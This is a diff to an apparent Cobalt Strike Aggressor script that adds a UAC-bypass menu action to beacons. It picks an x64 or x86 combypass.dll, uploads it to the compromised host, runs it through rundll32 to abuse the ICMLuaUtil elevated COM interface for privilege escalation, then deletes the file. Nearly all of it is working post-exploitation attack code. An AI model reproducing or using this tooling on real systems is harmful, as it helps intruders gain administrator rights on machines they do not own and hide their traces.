@@ -1,7 +1,15 @@
 sub combypassuac_{
+	if (-is64 $3['bid']){
+		blog($3['bid'], "The Beacon Arch:x64");
+		$dllpath = script_resource("dll/x64/combypass.dll");
+	}else{
+		blog($3['bid'], "The Beacon Arch:x86");
+		$dllpath = script_resource("dll/x86/combypass.dll");
+	}
+
 	btask($3['bid'], "Type: Elevated COM interface");
 	btask($3['bid'], "Method: ICMLuaUtil");
-	bupload($3['bid'], script_resource("combypass.dll"));
+	bupload($3['bid'], $dllpath);
 	bshell($3['bid'], "rundll32 combypass.dll,MyBypassUAC $3['executepath']");
 	brm($3['bid'], "combypass.dll");
 }
@@ -15,6 +23,7 @@ sub combypassuac{
 		dialog_show($dialog);
 	}
 }
+
 
 popup beacon_bottom{
 	menu "&bypassuac"{
